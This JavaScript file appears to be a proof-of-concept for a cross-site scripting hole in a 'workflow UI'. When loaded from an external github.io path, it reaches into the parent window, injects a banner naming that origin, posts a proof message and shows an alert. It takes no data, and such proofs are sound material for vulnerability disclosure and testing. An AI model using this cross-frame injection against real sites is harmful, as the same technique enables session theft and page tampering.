(() => {
  const host = window.parent;
  const document = host.document;
  const id = 'wfui-xss-proof';
  const existing = document.getElementById(id);
  if (existing) existing.remove();

  const proof = document.createElement('div');
  proof.id = id;
  proof.textContent = `GitHub file9.js executed on ${host.location.origin}`;
  proof.style.cssText = [
    'position:fixed',
    'inset:16px 16px auto',
    'z-index:2147483647',
    'padding:16px',
    'border:3px solid #fb7185',
    'border-radius:12px',
    'background:#111827',
    'color:#fff',
    'font:700 18px system-ui',
    'text-align:center'
  ].join(';');
  document.body.prepend(proof);

  host.postMessage({
    type: 'WORKFLOW_UI_GITHUB_FILE9_PROOF',
    source: 'https://lmzkjmiajzj-lgtm.github.io/tests/file9.js',
    origin: host.location.origin,
    executedAt: new Date().toISOString()
  }, host.location.origin);

  try { host.alert(proof.textContent); } catch {}
})();
